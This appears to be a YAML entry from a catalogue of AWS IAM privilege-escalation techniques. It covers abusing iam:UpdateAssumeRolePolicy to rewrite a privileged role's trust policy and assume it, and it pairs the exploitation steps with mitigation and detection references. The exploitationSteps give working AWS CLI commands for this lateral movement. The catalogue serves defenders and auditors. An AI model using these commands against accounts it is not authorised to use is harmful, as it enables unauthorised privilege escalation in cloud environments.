id: iam-012
name: iam:UpdateAssumeRolePolicy
category: lateral-movement
services:
- iam
description: Anyone with access to `iam:UpdateAssumeRolePolicy` can modify the trust policy of any role they have this permission
  on. This permission is often abused by one principal to modify a privileged role's trust policy to allow themselves to assume
  it, thereby gaining access to the privileged role's permissions.
exploitationSteps:
  awscli:
  - step: 1
    command: aws iam update-assume-role-policy --role-name @rolename --policy-document file://trust_policy.json
    description: Update the role's trust policy to allow your principal to assume it
  - step: 2
    command: aws sts assume-role --role-arn arn:aws:iam::123456789012:role/@rolename --role-session-name exploit
    description: Assume the privileged role
  - step: 3
    command: '# Configure AWS CLI with the temporary credentials from assume-role'
    description: Use the elevated permissions of the assumed role
recommendation: |
  Restrict access to `iam:UpdateAssumeRolePolicy` using the principle of least privilege.
  Very few principals need this permission, so it should be restricted to only the few
  principals that need it. Monitor use of this sensitive permission using CloudSIEM
  detections, and look for usage anomalies.
discoveredBy:
  name: Spencer Gietzen
  organization: Rhino Security Labs
  date: '2019'
references:
- title: AWS Privilege Escalation Methods and Mitigation
  url: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
detectionRules:
- platform: CloudSIEM
  url: https://docs.datadoghq.com/security/default_rules/7b6-2a8-df9/
toolSupport:
  pmapper: true
  iamVulnerable: true
permissions:
  required:
  - permission: iam:UpdateAssumeRolePolicy
    resourceConstraints: Target role must be in the Resource section
  additional:
  - permission: iam:ListUsers
    resourceConstraints: Helpful for discovering target users
  - permission: iam:GetUser
    resourceConstraints: Useful for viewing user details
